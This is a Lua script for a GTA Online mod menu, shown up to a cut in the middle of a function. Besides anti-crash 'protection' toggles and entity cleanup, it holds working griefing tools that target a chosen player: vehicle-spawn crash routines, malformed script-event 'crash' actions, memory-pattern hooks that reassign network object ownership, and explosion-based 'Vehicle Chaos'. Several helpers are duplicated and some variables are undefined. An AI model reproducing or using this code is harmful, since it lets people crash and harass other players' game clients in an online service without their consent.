
---░█████╗░██████╗░░█████╗░░██████╗██╗░░██╗██╗░░██╗
---██╔══██╗██╔══██╗██╔══██╗██╔════╝██║░░██║██║░░██║
---██║░░╚═╝██████╔╝███████║╚█████╗░███████║███████║
---██║░░██╗██╔══██╗██╔══██║░╚═══██╗██╔══██║██╔══██║
---╚█████╔╝██║░░██║██║░░██║██████╔╝██║░░██║██║░░██║
---░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝

util.require_natives("natives-1663599433-uno")
util.require_natives("natives-1640181023")
util.require_natives("natives-1651208000")

---------------------------------------------------------------------------------------------------------------------------------------
local function BlockSyncsExcept(pid, state) -- false as in allow syncs, true as in block syncs
    for _, pid2 in pairs(players.list(false, true, true)) do
        if pid ~= pid2 then
            menu.trigger_commands("desync "..players.get_name(pid2).." "..(state and "on" or "off"))
            menu.trigger_commands("ignore "..players.get_name(pid2).." "..(state and "on" or "off"))
            util.log("desync "..players.get_name(pid2).." "..(state and "on" or "off"))
            util.log("ignore "..players.get_name(pid2).." "..(state and "on" or "off"))
            util.yield()
        end
    end
end

--@alias Entity integer

---@param entity Entity
---@param distance number
---@return userdata

GetCoordsInFrontOfEntity = function(entity, distance)
	if not ENTITY.DOES_ENTITY_EXIST(entity) then
		return v3.new(0.0, 0.0, 0.0)
	end
	local coords = ENTITY.GET_ENTITY_FORWARD_VECTOR(entity)
	coords:mul(distance)
	coords:add(ENTITY.GET_ENTITY_COORDS(entity, true))
	return coords
end


---@param list Entity[]

function RqModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    local count = 0
    util.toast("Requesting model...")
    while not STREAMING.HAS_MODEL_LOADED(hash) and count < 100 do
        STREAMING.REQUEST_MODEL(hash)
        count = count + 1
        util.yield(10)
    end
    if not STREAMING.HAS_MODEL_LOADED(hash) then
        util.toast("Tried for 1 second, couldn't load this specified model!")
    end
end

function GetLocalPed()
    return PLAYER.PLAYER_PED_ID()
end

G_GeneratedList = false --



local function request_model(hash)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        util.yield()
    end
end

function AddEntityToList(listName, handle, generatedCheck)
    if ((not G_GeneratedList) and generatedCheck) or (not generatedCheck) then
        G_GeneratedList = true
        local lis = menu.list(menu.my_root(), listName .. " handle " .. handle, {}, "")
        menu.action(lis, "Delete", {}, "", function()
            entities.delete_by_handle(handle)
            menu.delete(lis)
            G_GeneratedList = false
        end)
        menu.action(lis, "Teleport to entity", {}, "", function()
            local pos = ENTITY.GET_ENTITY_COORDS(handle)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(GetLocalPed(), pos.x, pos.y, pos.z + 1, false, false, false)
        end)
        menu.action(lis, "Drive Entity", {}, "", function()
            PED.SET_PED_INTO_VEHICLE(GetLocalPed(), handle, -1)
        end)
        menu.action(lis, "Teleport to you", {}, "", function()
            local pos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(handle, pos.x, pos.y, pos.z + 1, false, false, false)
        end)
    end
end

function CreateVehicle(Hash, Pos, Heading, Invincible)
	STREAMING.REQUEST_MODEL(Hash)
	while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
	local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
	if Invincible then
		ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
	end
	return SpawnedVehicle
end


local function setAttribute(attacker)
    PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 46, true)

    PED.SET_PED_COMBAT_RANGE(attacker, 4)
    PED.SET_PED_COMBAT_ABILITY(attacker, 3)
end

local function BlockSyncs(pid, callback)
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= pid then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "on")
		end
	end
	util.yield(10)
	callback()
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= pid then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "off")
		end
	end
end


local selectedobject = -1268884662
local all_objects = {-1268884662,310817095,4130089803,148511758,3087007557,2969831089,3533371316,2024855755,2450168807,297107423
} 
local object_names = {"Bricks" ,"Fragment","Gas","Ball","Flagpole","Combat MG","Mag1","Barrel","40mm","Corp Rope"}

local AntiCrashCam <const> = menu.ref_by_path("Game>Camera>Anti-Crash Camera", 38)
local function RequestModel(Hash, timeout)
    STREAMING.REQUEST_MODEL(Hash)
    local time = util.current_time_millis() + (timeout or 1000)
    while time > util.current_time_millis() and not STREAMING.HAS_MODEL_LOADED(Hash) do
        util.yield()
    end
    return STREAMING.HAS_MODEL_LOADED(Hash)
end
local function RequestControl(Entity, timeout)
    local time = util.current_time_millis() + (timeout or 1000)
    while time > util.current_time_millis() and not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(Entity) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(Entity)
        util.yield()
    end
    return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(Entity)
end
local function ClearEntities(list)
    for _, entity in pairs(list) do
        if ENTITY.DOES_ENTITY_EXIST(entity) then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, false, false)
            RequestControl(entity)
            entities.delete_by_handle(entity)
        end
    end
end
local function CreateObject(Hash, Pos, static)
    RequestModel(Hash)
    local Object = entities.create_object(Hash, Pos)
    ENTITY.FREEZE_ENTITY_POSITION(Object, (static or false))
    return Object
end

---------------------------------------------------------------------------------------------------------------------------------------

---@alias Entity integer

---@param entity Entity
---@param distance number
---@return userdata
GetCoordsInFrontOfEntity = function(entity, distance)
	if not ENTITY.DOES_ENTITY_EXIST(entity) then
		return v3.new(0.0, 0.0, 0.0)
	end
	local coords = ENTITY.GET_ENTITY_FORWARD_VECTOR(entity)
	coords:mul(distance)
	coords:add(ENTITY.GET_ENTITY_COORDS(entity, true))
	return coords
end

---@param entity Entity
RequestControl = function(entity, timeOut)
	timeOut = timeOut or 1000
	local start = util.current_time_millis()
	while not NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity) and
	util.current_time_millis() - start < timeOut do
		util.yield_once()
	end
	return util.current_time_millis() - start < timeOut
end

---@param list Entity[]
ClearEntities = function(list)
	for _, entity in ipairs(list) do
		if ENTITY.DOES_ENTITY_EXIST(entity) then
			ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, false, false)
			RequestControl(entity)
			entities.delete_by_handle(entity)
		end
	end
end

function CreateVehicle(Hash, Pos, Heading, Invincible)
	STREAMING.REQUEST_MODEL(Hash)
	while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
	local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
	if Invincible then
		ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
	end
	return SpawnedVehicle
end

function CreateObject(Hash, Pos, static)
	STREAMING.REQUEST_MODEL(Hash)
	while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
	local SpawnedVehicle = entities.create_object(Hash, Pos)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
	if static then
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
	end
	return SpawnedVehicle
end

---------------------------------------------------------------------------------------------------------------------------------------


local colors = {
    green = 20,
    red = 23,
    yellow = 190,
    black = 2,
    white = 1,
    gray = 3,
    pink = 201,
    purple = 49, --, 21, 96
    blue = 11
}


local txdDict = "DIA_VICTIM"
local txdName = "DIA_VICTIM"

if filesystem.exists(filesystem.resources_dir() .. "Yatekomo.ytd") then
    util.register_file(filesystem.resources_dir() .. "Yatekomo.ytd")
    txdDict = "Yatekomo"
    txdName = "earth"
end
local function request_model(hash)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        util.yield()
    end
end
local function BlockSyncs(pid, callback)
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= pid then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "on")
		end
	end
	util.yield(10)
	callback()
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= pid then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "off")
		end
	end
end
function notification(msg, color)
    if not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(txdDict) then
        GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(txdDict)
        while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(txdDict) do
            util.yield()
        end
    end
    HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)
    -- HUD.BEGIN_TEXT_COMMAND_THEFEED_POST("STRING")
    -- HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(msg)
    util.BEGIN_TEXT_COMMAND_THEFEED_POST(msg)
    HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(txdDict, txdName, true, 15, "TODO!!!", "~c~CRASH!!!~s~")
    HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(true, false)
end
notification("TIME!!!", colors.black)

local function CreateVehicle(Hash, Pos, Heading, Invincible)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if Invincible then
        ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end

local function log(content)
end

local orgScan = memory.scan

---@param name string
---@param pattern string
---@param callback fun(address: integer)
function memory.scan(name, pattern, callback)
    local address = orgScan(pattern)
    if address ~= NULL then
        util.log("Encontrado " .. name)
        callback(address)
    else
        util.log("No se encontro " .. name)
        util.stop_script()
    end
end

---@param entity Entity
---@return integer
function get_net_obj(entity)
    local pEntity = entities.handle_to_pointer(entity)
    return pEntity ~= NULL and memory.read_long(pEntity + 0x00D0) or NULL
end

---@param entity Entity
---@return Player
function get_entity_owner(entity)
    local net_obj = get_net_obj(entity)
    return net_obj ~= NULL and memory.read_byte(net_obj + 0x49) or -1
end

---@param player integer
---@return integer
function GetNetGamePlayer(player)
    return util.call_foreign_function(GetNetGamePlayer_addr, player)
end

memory.scan("GetNetGamePlayer", "48 83 EC ? 33 C0 38 05 ? ? ? ? 74 ? 83 F9", function (address)
    GetNetGamePlayer_addr = address
end)
memory.scan("CNetworkObjectMgr", "48 8B 0D ? ? ? ? 45 33 C0 E8 ? ? ? ? 33 FF 4C 8B F0", function (address)
    CNetworkObjectMgr = memory.rip(address + 3)
end)
memory.scan("ChangeNetObjOwner", "48 8B C4 48 89 58 08 48 89 68 10 48 89 70 18 48 89 78 20 41 54 41 56 41 57 48 81 EC ? ? ? ? 44 8A 62 4B", function (address)
    ChangeNetObjOwner_addr = address
end)

local function ChangeNetObjOwner(object, player)
    if NETWORK.NETWORK_IS_IN_SESSION() then
        local net_object_mgr = memory.read_long(CNetworkObjectMgr)
        if net_object_mgr == NULL then
            return false
        end
        if not ENTITY.DOES_ENTITY_EXIST(object) then
            return false
        end
        local netObj = get_net_obj(object)
        if netObj == NULL then
            return false
        end
        local net_game_player = GetNetGamePlayer(player)
        if net_game_player == NULL then
            return false
        end
        util.call_foreign_function(ChangeNetObjOwner_addr, net_object_mgr, netObj, net_game_player, 0)
        return true
    else
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
        return true
    end
end

local function get_interior_player_is_in(pid)
    return memory.read_int(memory.script_global(((2689224 + 1) + (pid * 451)) + 242)) 
end

local function is_player_in_interior(pid)
    return (memory.read_int(memory.script_global(((2689224 + 1) + (pid * 451)) + 242 )) == 0)
end

local get_blip_coords = function(blipId)
    local blip = HUD.GET_FIRST_BLIP_INFO_ID(blipId)
    if blip ~= 0 then return HUD.GET_BLIP_COORDS(blip) end
    return v3(0, 0, 0)
end

local function notification(message, length) 
    if length ~= nil and length > 0 then
        length = length*1000
    else
        length = 3000
    end
end

local function RqModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    local time = util.current_time_millis() + 5000
    while not STREAMING.HAS_MODEL_LOADED(hash) and time > util.current_time_millis() do
        STREAMING.REQUEST_MODEL(hash)
        util.yield()
    end
    return STREAMING.HAS_MODEL_LOADED(hash)
end
local getEntityCoords = ENTITY.GET_ENTITY_COORDS
local getPlayerPed = PLAYER.GET_PLAYER_PED
local requestModel = STREAMING.REQUEST_MODEL
local hasModelLoaded = STREAMING.HAS_MODEL_LOADED
local noNeedModel = STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED

local function BadNetVehicleCrash(pid)
    local hashes = {-1041692462}
    local vehicles = {}
    for i = 1, 4 do
        util.create_thread(function()
            RqModel(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(pid))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x+5, pcoords.y+5, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = getEntityCoords(getPlayerPed(pid))
                util.yield()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
    util.yield()
    util.toast("finished.")
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end
local function BadNetVehicleCrash3(pid)
    local hashes = {1349725314,-1041692462,-255678177,1591739866}
    local vehicles = {}
    for i = 1, 4 do
        util.create_thread(function()
            RqModel(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(pid))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = getEntityCoords(getPlayerPed(pid))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                util.yield()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
    util.yield()
    util.toast("finished.")
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end

menu.action(menu.my_root(), "Go to Players List", {"gotopl"}, "Shotcut for players list.", function()
    menu.trigger_commands("playerlist")
end)

protex = menu.list(menu.my_root(), "Protections", {}, "", function() end)

menu.action(protex, "Stop All Sounds", {}, "", function()
    for i = -1, 100 do
        AUDIO.STOP_SOUND(i)
        AUDIO.RELEASE_SOUND_ID(i)
    end
end)

menu.action(protex, "Remove Attachments", {""}, "", function()
    notification("Removing Attachments", colors.black)
    if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
        menu.trigger_commands("mpmale")
    else
        menu.trigger_commands("mpfemale")
    end
end)

menu.click_slider(protex,"Clear Entities", {""}, "1 = NPC, 2 = Veh, 3 = Object, 4 = Pickup, 5 = All", 1, 5, 1, 1, function(on_change)
    if on_change == 1 then
        local count = 0
        for k,ent in pairs(entities.get_all_peds_as_handles()) do
            if not PED.IS_PED_A_PLAYER(ent) then
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
                entities.delete_by_handle(ent)
                util.yield()
                count = count + 1
            end
        end
        notification(count .. "NPC have been cleared", colors.green)
    end
    if on_change == 2 then
        local count = 0
        for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
            local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
            if not PED.IS_PED_A_PLAYER(PedInSeat) then
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
                entities.delete_by_handle(ent)
                util.yield()
                count = count + 1
            end
        end
        notification(count .. "Veh have been Cleared", colors.green)
        return
    end
    if on_change == 3 then
        local count = 0
        for k,ent in pairs(entities.get_all_objects_as_handles()) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
            count = count + 1
            util.yield()
        end
        notification(count .. "Object have been Cleared", colors.green)
        return
    end
    if on_change == 4 then
        local count = 0
        for k,ent in pairs(entities.get_all_pickups_as_handles()) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
            count = count + 1
            util.yield()
        end
        notification(count .. " Pickup have been Cleared", colors.green)
        return
    end
    if on_change == 5 then
        local count = 0
        for k,ent in pairs(entities.get_all_peds_as_handles()) do
            if not PED.IS_PED_A_PLAYER(ent) then
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
                entities.delete_by_handle(ent)
                util.yield()
                count = count + 1
            end
        end

        for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
            local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
            if not PED.IS_PED_A_PLAYER(PedInSeat) then
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
                entities.delete_by_handle(ent)
                util.yield()
                count = count + 1
            end
        end

        for k,ent in pairs(entities.get_all_objects_as_handles()) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
            count = count + 1
            util.yield()
        end

        for k,ent in pairs(entities.get_all_pickups_as_handles()) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
            count = count + 1
            util.yield()
        end
        notification(count .. "All Cleared", colors.green)
        return
    end
end)
menu.action(protex, "Clear Everything", {"cleanse"}, "", function()
    util.toast("Cleaning Area...")
    util.yield(500)
    local entitycount = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        if ped ~= players.user_ped() and not PED.IS_PED_A_PLAYER(ped) and not ENTITY.IS_ENTITY_A_MISSION_ENTITY(ped) then
            entities.delete_by_handle(ped)
            entitycount += 1
        end
    end
    util.toast("Cleared " .. entitycount .. " Peds")
    for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
        if vehicle ~= PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) and not ENTITY.IS_ENTITY_A_MISSION_ENTITY(veh) then
            entities.delete_by_handle(veh)
            util.yield()
            entitycount += 1
        end
    end
    util.toast("Cleared ".. entitycount .." Vehicles")
    for _, object in pairs(entities.get_all_objects_as_handles()) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
        entities.delete_by_handle(object)
        util.yield()
        entitycount += 1
    end
    util.toast("Cleared " .. entitycount .. " Objects")
    for _, pickup in pairs(entities.get_all_pickups_as_handles()) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(pickup, false, false)
        entities.delete_by_handle(pickup)
        util.yield()
        entitycount += 1
    end
    util.toast("Cleared " .. entitycount .. " Pickups")
    util.toast("Cleansing You Of Skidded Ropes")
    local temp = memory.alloc(4)
    for i = 1, 100 do
        memory.write_int(temp, i)
        PHYSICS.DELETE_ROPE(temp)
        util.yield()
    end
    util.toast("Cleared All Ropes")
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    MISC.CLEAR_AREA_OF_PROJECTILES(coords.x, coords.y, coords.z, 400, 0)
    util.toast("Cleared All Projectiles")
    util.yield(500)
    util.toast("Area Has Been Cleaned!")
end)
menu.action(protex, "Super cleanse", {"JUST DO IT"}, "", function(on_click)
    local ct = 0
    notification("Working", colors.black)
    for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
        entities.delete_by_handle(ent)

        ct = ct + 1
    end
    util.toast("Finished")
    for k,ent in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ent) then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)

        end
        ct = ct + 1
    end

end)
menu.divider(protex, "Crash Protections")


menu.toggle(protex, "Toggle Block all Network Events", {}, "Block all network event transmission", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    if on_toggle then
        menu.trigger_command(BlockNetEvents)
        notification("Toggling block all network events on... stay safe homie", colors.green)
    else
        menu.trigger_command(UnblockNetEvents)
        notification("toggling block all network events off...", colors.red)
    end
end)


menu.toggle(protex, "Toggle Block all Incoming Syncs", {}, "", function(on_toggle)
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_command(BlockIncSyncs)
        notification("Toggling block all incoming syncs on... stay safe homie", colors.green)
    else
        menu.trigger_command(UnblockIncSyncs)
        notification("toggling block all incoming syncs off...", colors.red)
    end
end)

menu.toggle(protex, "Toggle Block all Outgoing Syncs", {}, "", function(on_toggle)
    if on_toggle then
        notification("Toggling block all outgoing syncs on", colors.green)
        menu.trigger_commands("desyncall on")
    else
        notification("Toggling block all outgoing syncs off", colors.red)
        menu.trigger_commands("desyncall off")
    end
end)

menu.toggle(protex, "Anticrashcam", {"acc"}, "", function(on_toggle)
    if on_toggle then
        notification("Toggling anticrashcam... stay safe homie", colors.green)
        menu.trigger_commands("anticrashcam on")
        menu.trigger_commands("potatomode on")
    else
        notification("Toggling anticrashcam off...", colors.red)
        menu.trigger_commands("anticrashcam off")
        menu.trigger_commands("potatomode off")
    end
end)



menu.toggle(protex, "Panic Mod", {"panic"}, "Stay safe homie", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        notification("toggling panic mode on... stay safe homie", colors.green)
        menu.trigger_commands("desyncall on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")
    else
        notification("toggling panic mode off...", colors.red)
        menu.trigger_commands("desyncall off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end
end)

    players.on_join(function(pid)

        menu.divider(menu.player_root(pid), "<TODO> Script")
        local root = menu.list(menu.player_root(pid), "<TODO> Script")

    menu.divider(root, "TODO")

    local Removals_List = menu.list(root, "Crashes", {"crashlist"}, "")
    local Plyrveh_list = menu.list(root, "Griefing Options", {"vehlist", ""})

    menu.divider(Removals_List, "TODO Crashes")

    menu.toggle_loop(Plyrveh_list, "TP On Ped Loop", {"tploopon"}, "", function(on_toggle)
        if on_toggle then
        menu.trigger_commands("tp" .. players.get_name(pid))
        else
        menu.trigger_commands("tp" .. players.get_name(pid))
        end
        end)

        local dont_stop = false
        menu.toggle_loop(Plyrveh_list,"Vehicle Chaos", {"chaosyeet"}, "Basically 'impulse like sport mode. but applied to every vehicle", function(on)
            notification("Vehicle Chaos sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
                local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
                local locspeed2 = speed
                        local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
                if not PED.IS_PED_A_PLAYER(PedInSeat) then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
              ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                            vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                            speed = 100
                            local x_vec = (holecoords['x']-vcoords['x'])*speed
                            local y_vec = (holecoords['y']-vcoords['y'])*speed
                            local z_vec = ((holecoords['z']+hole_zoff)-vcoords['z'])*speed
                            ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                            VEHICLE.START_VEHICLE_HORN(veh, 200, util.joaat("HELDDOWN"), true)
                            FIRE.ADD_EXPLOSION(vcoords['x'], vcoords['y'], vcoords['z'], 7, 100.0, true, false, 1.0)
                            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, x_vec, y_vec, z_vec, true, false, true, true)
                            VEHICLE.SET_VEHICLE_DAMAGE(veh, math.random(-5.0, 5.0), math.random(-5.0, 5.0), math.random(-5.0,5.0), 200.0, 10000.0, true)
                    if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
                        VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
                    end
                end
            end
        end)
        
    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        hole_zoff = 50
            menu.slider(Plyrveh_list, "Blackhole Z-offset", {"blackholeoffset"}, "", 0, 100, 50, 10, function(s)
            hole_zoff = s
        end)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

        local newcrash = menu.list(Removals_List, "Annoy Modders", {}, "")

        local ryzecrash = menu.list(Removals_List, "Ryze Crashes", {}, "")

        local begcrash = {
            "Hey bro, it would be pretty poggers to close your game for me",
            "pwease cwash yowour game fowor me",
            "Close your game. I'm not asking.",
            "Please close your game, please please please please please",
            "Hey bro, it would be pretty poggers to close your game for me",
            "pwease cwash yowour game fowor me",
            "Close your game. I'm not asking.",
            "Please close your game, please please please please please",
            "Hey bro, it would be pretty poggers to close your game for me",
            "pwease cwash yowour game fowor me",
            "Close your game. I'm not asking.",
            "Please close your game, please please please please please",
            "Hey bro, it would be pretty poggers to close your game for me",
            "pwease cwash yowour game fowor me",
            "Close your game. I'm not asking.",
            "Please close your game, please please please please please",
            "Please close your game, please please please please please",
        }
        
    menu.action(ryzecrash, "Frame Crash", {}, "Blocked by popular menus", function()
		menu.trigger_commands("smstext" .. players.get_name(pid).. " " .. begcrash[math.random(1, #begcrash)])
		util.yield()
		menu.trigger_commands("smssend" .. players.get_name(pid))
	end)

    menu.divider(ryzecrash, "Script Event")

    menu.action(ryzecrash, "Script crash 1", {}, "scrashv1", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << pid, {-555356783,1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << pid, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        end
    end)

    menu.action(ryzecrash, "Script crash 2", {"scrashv2"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
